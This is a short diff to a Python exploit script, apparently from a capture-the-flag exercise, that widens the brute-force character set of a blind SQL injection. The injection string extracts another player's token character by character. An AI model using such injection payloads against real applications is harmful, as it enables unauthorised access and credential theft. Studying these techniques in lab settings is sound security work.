@@ -162,7 +162,7 @@ injection = "' OR (ip='teammate IP' AND substring(token,%s,1)='%s') AND '1'='1"
 token = ''
 
 for i in range(1, 101):
-  for b in 'abcdefghijklmnopqrstuvwxyz':
+  for b in 'abcdefghijklmnopqrstuvwxyz0123456789':
     # Resetting the session and requesting a new one, just in case.
     # The exploit would have been faster by removing this.
     requests.get(url.replace('play', 'reset'))
